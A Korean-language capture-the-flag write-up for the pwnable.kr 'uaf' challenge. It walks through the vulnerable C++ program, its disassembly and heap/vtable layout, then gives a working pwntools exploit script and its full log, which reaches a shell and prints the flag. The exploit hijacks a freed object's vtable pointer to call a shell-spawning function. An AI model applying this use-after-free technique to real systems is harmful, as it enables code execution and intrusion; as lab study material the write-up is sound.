# uaf

## uaf.cpp

```cpp
#include <fcntl.h>
#include <iostream> 
#include <cstring>
#include <cstdlib>
#include <unistd.h>
using namespace std;

class Human{
private:
	virtual void give_shell(){
		system("/bin/sh");
	}
protected:
	int age;
	string name;
public:
	virtual void introduce(){
		cout << "My name is " << name << endl;
		cout << "I am " << age << " years old" << endl;
	}
};

class Man: public Human{
public:
	Man(string name, int age){
		this->name = name;
		this->age = age;
        }
        virtual void introduce(){
		Human::introduce();
                cout << "I am a nice guy!" << endl;
        }
};

class Woman: public Human{
public:
        Woman(string name, int age){
                this->name = name;
                this->age = age;
        }
        virtual void introduce(){
                Human::introduce();
                cout << "I am a cute girl!" << endl;
        }
};

int main(int argc, char* argv[]){
	Human* m = new Man("Jack", 25);
	Human* w = new Woman("Jill", 21);

	size_t len;
	char* data;
	unsigned int op;
	while(1){
		cout << "1. use\n2. after\n3. free\n";
		cin >> op;

		switch(op){
			case 1:
				m->introduce();
				w->introduce();
				break;
			case 2:
				len = atoi(argv[1]);
				data = new char[len];
				read(open(argv[2], O_RDONLY), data, len);
				cout << "your data is allocated" << endl;
				break;
			case 3:
				delete m;
				delete w;
				break;
			default:
				break;
		}
	}

	return 0;	
}
```

`uaf`취약점이 생길 수 있는 코드다. 동적으로 `m`과 `w`를 생성하고 삭제 한 후 다시 접근하는 코드가 존재한다. `Man`, `Woman` 각각 `Human`에 `give_shell()` 함수가 존재한다. 일단 gdb로 분석해보면 아래와 같다.

C++은 함수 오버로딩을 처리하기 위해 컴파일러에 의해 기본적으로 `mangle`이 되므로 아래 명령어로 그것을 풀어줘야한다.

    set print asm-demangle on
<details>
   <summary>show disassembled main</summary>

```asm
Dump of assembler code for function main:
   0x0000000000400ec4 <+0>:	push   rbp
   0x0000000000400ec5 <+1>:	mov    rbp,rsp
   0x0000000000400ec8 <+4>:	push   r12
   0x0000000000400eca <+6>:	push   rbx
   0x0000000000400ecb <+7>:	sub    rsp,0x50
   0x0000000000400ecf <+11>:	mov    DWORD PTR [rbp-0x54],edi
   0x0000000000400ed2 <+14>:	mov    QWORD PTR [rbp-0x60],rsi
   0x0000000000400ed6 <+18>:	lea    rax,[rbp-0x12]
   0x0000000000400eda <+22>:	mov    rdi,rax
   0x0000000000400edd <+25>:	call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400ee2 <+30>:	lea    rdx,[rbp-0x12]
   0x0000000000400ee6 <+34>:	lea    rax,[rbp-0x50]
   0x0000000000400eea <+38>:	mov    esi,0x4014f0
   0x0000000000400eef <+43>:	mov    rdi,rax
   0x0000000000400ef2 <+46>:	call   0x400d10 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
   0x0000000000400ef7 <+51>:	lea    r12,[rbp-0x50]
   0x0000000000400efb <+55>:	mov    edi,0x18
   0x0000000000400f00 <+60>:	call   0x400d90 <operator new(unsigned long)@plt>
---Type <return> to continue, or q <return> to quit---
   0x0000000000400f05 <+65>:	mov    rbx,rax
   0x0000000000400f08 <+68>:	mov    edx,0x19
   0x0000000000400f0d <+73>:	mov    rsi,r12
   0x0000000000400f10 <+76>:	mov    rdi,rbx
   0x0000000000400f13 <+79>:	call   0x401264 <Man::Man(std::string, int)>
   0x0000000000400f18 <+84>:	mov    QWORD PTR [rbp-0x38],rbx
   0x0000000000400f1c <+88>:	lea    rax,[rbp-0x50]
   0x0000000000400f20 <+92>:	mov    rdi,rax
   0x0000000000400f23 <+95>:	call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000400f28 <+100>:	lea    rax,[rbp-0x12]
   0x0000000000400f2c <+104>:	mov    rdi,rax
   0x0000000000400f2f <+107>:	call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f34 <+112>:	lea    rax,[rbp-0x11]
   0x0000000000400f38 <+116>:	mov    rdi,rax
   0x0000000000400f3b <+119>:	call   0x400d70 <std::allocator<char>::allocator()@plt>
   0x0000000000400f40 <+124>:	lea    rdx,[rbp-0x11]
   0x0000000000400f44 <+128>:	lea    rax,[rbp-0x40]
   0x0000000000400f48 <+132>:	mov    esi,0x4014f5
   0x0000000000400f4d <+137>:	mov    rdi,rax
   0x0000000000400f50 <+140>:	call   0x400d10 <std::basic_string<char, std::cha---Type <return> to continue, or q <return> to quit---
r_traits<char>, std::allocator<char> >::basic_string(char const*, std::allocator<char> const&)@plt>
   0x0000000000400f55 <+145>:	lea    r12,[rbp-0x40]
   0x0000000000400f59 <+149>:	mov    edi,0x18
   0x0000000000400f5e <+154>:	call   0x400d90 <operator new(unsigned long)@plt>
   0x0000000000400f63 <+159>:	mov    rbx,rax
   0x0000000000400f66 <+162>:	mov    edx,0x15
   0x0000000000400f6b <+167>:	mov    rsi,r12
   0x0000000000400f6e <+170>:	mov    rdi,rbx
   0x0000000000400f71 <+173>:	call   0x401308 <Woman::Woman(std::string, int)>
   0x0000000000400f76 <+178>:	mov    QWORD PTR [rbp-0x30],rbx
   0x0000000000400f7a <+182>:	lea    rax,[rbp-0x40]
   0x0000000000400f7e <+186>:	mov    rdi,rax
   0x0000000000400f81 <+189>:	call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000400f86 <+194>:	lea    rax,[rbp-0x11]
   0x0000000000400f8a <+198>:	mov    rdi,rax
   0x0000000000400f8d <+201>:	call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x0000000000400f92 <+206>:	mov    esi,0x4014fa
   0x0000000000400f97 <+211>:	mov    edi,0x602260
   0x0000000000400f9c <+216>:	call   0x400cf0 <std::basic_ostream<char, std::ch---Type <return> to continue, or q <return> to quit---
ar_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000400fa1 <+221>:	lea    rax,[rbp-0x18]
   0x0000000000400fa5 <+225>:	mov    rsi,rax
   0x0000000000400fa8 <+228>:	mov    edi,0x6020e0
   0x0000000000400fad <+233>:	call   0x400dd0 <std::istream::operator>>(unsigned int&)@plt>
   0x0000000000400fb2 <+238>:	mov    eax,DWORD PTR [rbp-0x18]
   0x0000000000400fb5 <+241>:	cmp    eax,0x2
   0x0000000000400fb8 <+244>:	je     0x401000 <main+316>
   0x0000000000400fba <+246>:	cmp    eax,0x3
   0x0000000000400fbd <+249>:	je     0x401076 <main+434>
   0x0000000000400fc3 <+255>:	cmp    eax,0x1
   0x0000000000400fc6 <+258>:	je     0x400fcd <main+265>
   0x0000000000400fc8 <+260>:	jmp    0x4010a9 <main+485>
   0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
   0x0000000000400fe2 <+286>:	call   rdx
   0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
---Type <return> to continue, or q <return> to quit---
   0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:	add    rax,0x8
   0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:	mov    rdi,rax
   0x0000000000400ff9 <+309>:	call   rdx
   0x0000000000400ffb <+311>:	jmp    0x4010a9 <main+485>
   0x0000000000401000 <+316>:	mov    rax,QWORD PTR [rbp-0x60]
   0x0000000000401004 <+320>:	add    rax,0x8
   0x0000000000401008 <+324>:	mov    rax,QWORD PTR [rax]
   0x000000000040100b <+327>:	mov    rdi,rax
   0x000000000040100e <+330>:	call   0x400d20 <atoi@plt>
   0x0000000000401013 <+335>:	cdqe   
   0x0000000000401015 <+337>:	mov    QWORD PTR [rbp-0x28],rax
   0x0000000000401019 <+341>:	mov    rax,QWORD PTR [rbp-0x28]
   0x000000000040101d <+345>:	mov    rdi,rax
   0x0000000000401020 <+348>:	call   0x400c70 <operator new[](unsigned long)@plt>
   0x0000000000401025 <+353>:	mov    QWORD PTR [rbp-0x20],rax
   0x0000000000401029 <+357>:	mov    rax,QWORD PTR [rbp-0x60]
   0x000000000040102d <+361>:	add    rax,0x10
   0x0000000000401031 <+365>:	mov    rax,QWORD PTR [rax]
   0x0000000000401034 <+368>:	mov    esi,0x0
---Type <return> to continue, or q <return> to quit---
   0x0000000000401039 <+373>:	mov    rdi,rax
   0x000000000040103c <+376>:	mov    eax,0x0
   0x0000000000401041 <+381>:	call   0x400dc0 <open@plt>
   0x0000000000401046 <+386>:	mov    rdx,QWORD PTR [rbp-0x28]
   0x000000000040104a <+390>:	mov    rcx,QWORD PTR [rbp-0x20]
   0x000000000040104e <+394>:	mov    rsi,rcx
   0x0000000000401051 <+397>:	mov    edi,eax
   0x0000000000401053 <+399>:	call   0x400ca0 <read@plt>
   0x0000000000401058 <+404>:	mov    esi,0x401513
   0x000000000040105d <+409>:	mov    edi,0x602260
   0x0000000000401062 <+414>:	call   0x400cf0 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
   0x0000000000401067 <+419>:	mov    esi,0x400d60
   0x000000000040106c <+424>:	mov    rdi,rax
   0x000000000040106f <+427>:	call   0x400d50 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>
   0x0000000000401074 <+432>:	jmp    0x4010a9 <main+485>
   0x0000000000401076 <+434>:	mov    rbx,QWORD PTR [rbp-0x38]
   0x000000000040107a <+438>:	test   rbx,rbx
   0x000000000040107d <+441>:	je     0x40108f <main+459>
   0x000000000040107f <+443>:	mov    rdi,rbx
   0x0000000000401082 <+446>:	call   0x40123a <Human::~Human()>
---Type <return> to continue, or q <return> to quit---
   0x0000000000401087 <+451>:	mov    rdi,rbx
   0x000000000040108a <+454>:	call   0x400c80 <operator delete(void*)@plt>
   0x000000000040108f <+459>:	mov    rbx,QWORD PTR [rbp-0x30]
   0x0000000000401093 <+463>:	test   rbx,rbx
   0x0000000000401096 <+466>:	je     0x4010a8 <main+484>
   0x0000000000401098 <+468>:	mov    rdi,rbx
   0x000000000040109b <+471>:	call   0x40123a <Human::~Human()>
   0x00000000004010a0 <+476>:	mov    rdi,rbx
   0x00000000004010a3 <+479>:	call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010a8 <+484>:	nop
   0x00000000004010a9 <+485>:	jmp    0x400f92 <main+206>
   0x00000000004010ae <+490>:	mov    r12,rax
   0x00000000004010b1 <+493>:	mov    rdi,rbx
   0x00000000004010b4 <+496>:	call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010b9 <+501>:	mov    rbx,r12
   0x00000000004010bc <+504>:	jmp    0x4010c1 <main+509>
   0x00000000004010be <+506>:	mov    rbx,rax
   0x00000000004010c1 <+509>:	lea    rax,[rbp-0x50]
   0x00000000004010c5 <+513>:	mov    rdi,rax
   0x00000000004010c8 <+516>:	call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x00000000004010cd <+521>:	jmp    0x4010d2 <main+526>
   0x00000000004010cf <+523>:	mov    rbx,rax
---Type <return> to continue, or q <return> to quit---
   0x00000000004010d2 <+526>:	lea    rax,[rbp-0x12]
   0x00000000004010d6 <+530>:	mov    rdi,rax
   0x00000000004010d9 <+533>:	call   0x400d40 <std::allocator<char>::~allocator()@plt>
   0x00000000004010de <+538>:	mov    rax,rbx
   0x00000000004010e1 <+541>:	mov    rdi,rax
   0x00000000004010e4 <+544>:	call   0x400da0 <_Unwind_Resume@plt>
   0x00000000004010e9 <+549>:	mov    r12,rax
   0x00000000004010ec <+552>:	mov    rdi,rbx
   0x00000000004010ef <+555>:	call   0x400c80 <operator delete(void*)@plt>
   0x00000000004010f4 <+560>:	mov    rbx,r12
   0x00000000004010f7 <+563>:	jmp    0x4010fc <main+568>
   0x00000000004010f9 <+565>:	mov    rbx,rax
   0x00000000004010fc <+568>:	lea    rax,[rbp-0x40]
   0x0000000000401100 <+572>:	mov    rdi,rax
   0x0000000000401103 <+575>:	call   0x400d00 <std::basic_string<char, std::char_traits<char>, std::allocator<char> >::~basic_string()@plt>
   0x0000000000401108 <+580>:	jmp    0x40110d <main+585>
   0x000000000040110a <+582>:	mov    rbx,rax
   0x000000000040110d <+585>:	lea    rax,[rbp-0x11]
   0x0000000000401111 <+589>:	mov    rdi,rax
   0x0000000000401114 <+592>:	call   0x400d40 <std::allocator<char>::~allocator()@plt>
---Type <return> to continue, or q <return> to quit---
   0x0000000000401119 <+597>:	mov    rax,rbx
   0x000000000040111c <+600>:	mov    rdi,rax
   0x000000000040111f <+603>:	call   0x400da0 <_Unwind_Resume@plt>
End of assembler dump.
```
</details>

```asm
   0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
   0x0000000000400fe2 <+286>:	call   rdx
   0x0000000000400fe4 <+288>:	mov    rax,QWORD PTR [rbp-0x30]
---Type <return> to continue, or q <return> to quit---
   0x0000000000400fe8 <+292>:	mov    rax,QWORD PTR [rax]
   0x0000000000400feb <+295>:	add    rax,0x8
   0x0000000000400fef <+299>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400ff2 <+302>:	mov    rax,QWORD PTR [rbp-0x30]
   0x0000000000400ff6 <+306>:	mov    rdi,rax
   0x0000000000400ff9 <+309>:	call   rdx
   0x0000000000400ffb <+311>:	jmp    0x4010a9 <main+485>
   ```
 이 부분이 1을 선택했을 때 실행하는 코드다. `call`을 두번 하는데 첫번째는 `m`, 두번째는 `w`의 `introduce()`를 호출하는 과정이다. 
 여기서 `m`은 `rbp-0x38`, `w`는 `rbp-0x30`에 존재함을 알 수 있고, 힙에 존재하는 객체의 8바이트 위의 함수를 첫번째 인자 `this`와 함께 호출한다. 

 ```bash
 (gdb) x/wx $rbp-0x38
0x7ffc2af949e8:	0x006c3c50
(gdb) x/wx 0x006c3c50
0x6c3c50:	0x00401570
(gdb) x/wx 0x00401570
0x401570 <vtable for Man+16>:	0x0040117a
(gdb) 
0x401574 <vtable for Man+20>:	0x00000000
(gdb) 
0x401578 <vtable for Man+24>:	0x004012d2
(gdb) 
0x40157c <vtable for Man+28>:	0x00000000
(gdb) x/wx 0x0040117a
0x40117a <Human::give_shell()>:	0xe5894855
(gdb) x/wx 0x004012d2
0x4012d2 <Man::introduce()>:	0xe5894855
(gdb) 
```

즉 `*m`은 `Human`의 `give_shell()`을 가리키고 있고, `*(m+8)`은 `Man`의 `introduce()`를 가리키고 있다.

```asm
[----------------------------------registers-----------------------------------]
RAX: 0x1d13c50 --> 0x401570 --> 0x40117a (<Human::give_shell()>:	push   rbp)
RBX: 0x1d13ca0 --> 0x401550 --> 0x40117a (<Human::give_shell()>:	push   rbp)
RCX: 0x0 
RDX: 0x7ffcb2328318 --> 0x1 
RSI: 0x0 
RDI: 0x7f35058fa140 --> 0x0 
RBP: 0x7ffcb2328330 --> 0x4013b0 (<__libc_csu_init>:	mov    QWORD PTR [rsp-0x28],rbp)
RSP: 0x7ffcb23282d0 --> 0x7ffcb2328418 --> 0x7ffcb2329e04 ("/home/uaf/uaf")
RIP: 0x400fd1 (<main+269>:	mov    rax,QWORD PTR [rax])
R8 : 0x7f350535d8e0 --> 0xfbad2288 
R9 : 0x7f350535f790 --> 0x0 
R10: 0x7f3505b0f740 (0x00007f3505b0f740)
R11: 0x7f350567f930 (<_ZNKSt7num_getIcSt19istreambuf_iteratorIcSt11char_traitsIcEEE14_M_extract_intIjEES3_S3_S3_RSt8ios_baseRSt12_Ios_IostateRT_>:	push   r15)
R12: 0x7ffcb23282f0 --> 0x1d13c88 --> 0x6c6c694a ('Jill')
R13: 0x7ffcb2328410 --> 0x3 
R14: 0x0 
R15: 0x0
EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x400fc6 <main+258>:	je     0x400fcd <main+265>
   0x400fc8 <main+260>:	jmp    0x4010a9 <main+485>
   0x400fcd <main+265>:	mov    rax,QWORD PTR [rbp-0x38]
=> 0x400fd1 <main+269>:	mov    rax,QWORD PTR [rax]
   0x400fd4 <main+272>:	add    rax,0x8
   0x400fd8 <main+276>:	mov    rdx,QWORD PTR [rax]
   0x400fdb <main+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x400fdf <main+283>:	mov    rdi,rax
[------------------------------------stack-------------------------------------]
0000| 0x7ffcb23282d0 --> 0x7ffcb2328418 --> 0x7ffcb2329e04 ("/home/uaf/uaf")
0008| 0x7ffcb23282d8 --> 0x30000ffff 
0016| 0x7ffcb23282e0 --> 0x1d13c38 --> 0x6b63614a ('Jack')
0024| 0x7ffcb23282e8 --> 0x401177 (<_GLOBAL__sub_I_main+19>:	pop    rbp)
0032| 0x7ffcb23282f0 --> 0x1d13c88 --> 0x6c6c694a ('Jill')
0040| 0x7ffcb23282f8 --> 0x1d13c50 --> 0x401570 --> 0x40117a (<Human::give_shell()>:	push   rbp)
0048| 0x7ffcb2328300 --> 0x1d13ca0 --> 0x401550 --> 0x40117a (<Human::give_shell()>:	push   rbp)
0056| 0x7ffcb2328308 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x0000000000400fd1 in main ()
gdb-peda$ 
```

현재 힙은 아래와 같이 구성되어 있을 것이다.

Heap | -
---- | ----
19 | m->age
&Human::give_shell() | *m
~~ | ~~

이제 `free`를 해주면 위의 값이 사라지고 `after`를 이용해 그자리에 그대로 값을 쓸 수가 있다.

힙에 `new` 연산자로 할당을 하는 과정을 보고 두 번째(8바이트씩) 할당한 값이 원래 `m`이 가리키던 자리에 들어가는 것을 확인, 그자리에 `0x401570 - 0x8`을 넣어주면 

```asm
   0x0000000000400fcd <+265>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fd1 <+269>:	mov    rax,QWORD PTR [rax]
   0x0000000000400fd4 <+272>:	add    rax,0x8
   0x0000000000400fd8 <+276>:	mov    rdx,QWORD PTR [rax]
   0x0000000000400fdb <+279>:	mov    rax,QWORD PTR [rbp-0x38]
   0x0000000000400fdf <+283>:	mov    rdi,rax
   0x0000000000400fe2 <+286>:	call   rdx
```

위 루틴에 의해 `0x401570`를 참조한 값을 `call`하게 된다.

## exploit.py

```python
from pwn import *              
                            
context.log_level = 'debug'                        
                                                  
shell = ssh('uaf', 'pwnable.kr', password='guest', port=2222)
sh = shell.run('~/uaf 8 /dev/stdin')                
sh.recv()                                            
sh.sendline('3')
sh.recv()     
sh.sendline('2')
sh.sendline('AAAAAAAA')
sh.recv()        
sh.sendline('2')  
sh.sendline(p64(0x401570 - 0x8))    
sh.sendline('1')
sh.recv()   
sleep(1)               
sh.sendline('cat flag')
sh.interactive()
```

`/dev/stdin`을 `open`하게 해서 `read`함수로 `stdin`을 연결 했다.

```bash
[+] Connecting to pwnable.kr on port 2222: Done
[*] passcode@pwnable.kr:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.10.0
    ASLR:     Enabled
[+] Opening new channel: 'stty raw -ctlecho -echo; cd . >/dev/null 2>&1;~/uaf 8 /dev/stdin': Done
[DEBUG] Received 0x18 bytes:
    '1. use\n'
    '2. after\n'
    '3. free\n'
[DEBUG] Sent 0x2 bytes:
    '3\n'
[DEBUG] Received 0x18 bytes:
    '1. use\n'
    '2. after\n'
    '3. free\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x9 bytes:
    'AAAAAAAA\n'
[DEBUG] Received 0x2f bytes:
    'your data is allocated\n'
    '1. use\n'
    '2. after\n'
    '3. free\n'
[DEBUG] Sent 0x2 bytes:
    '2\n'
[DEBUG] Sent 0x9 bytes:
    00000000  68 15 40 00  00 00 00 00  0a                        │h·@·│····│·│
    00000009
[DEBUG] Sent 0x2 bytes:
    '1\n'
[DEBUG] Received 0x31 bytes:
    'your data is allocated\n'
    '1. use\n'
    '2. after\n'
    '3. free\n'
    '$ '
[DEBUG] Sent 0x9 bytes:
    'cat flag\n'
[*] Switching to interactive mode
[DEBUG] Received 0x18 bytes:
    'yay_f1ag_aft3r_pwning\n'
    '$ '
yay_f1ag_aft3r_pwning
$ $ id
[DEBUG] Sent 0x3 bytes:
    'id\n'
[DEBUG] Received 0x50 bytes:
    'uid=1029(uaf) gid=1029(uaf) egid=1030(uaf_pwn) groups=1030(uaf_pwn),1029(uaf)\n'
    '$ '
uid=1029(uaf) gid=1029(uaf) egid=1030(uaf_pwn) groups=1030(uaf_pwn),1029(uaf)
$ $ exit
[DEBUG] Sent 0x5 bytes:
    'exit\n'
[DEBUG] Received 0x3f bytes:
    'bash: line 1: 50126 Segmentation fault      ~/uaf 8 /dev/stdin\n'
bash: line 1: 50126 Segmentation fault      ~/uaf 8 /dev/stdin
[*] Got EOF while reading in interactive
$ 
[DEBUG] Sent 0x1 bytes:
    '\n' * 0x1
[*] Closed SSH channel with pwnable.kr
[*] Got EOF while sending in interactive
```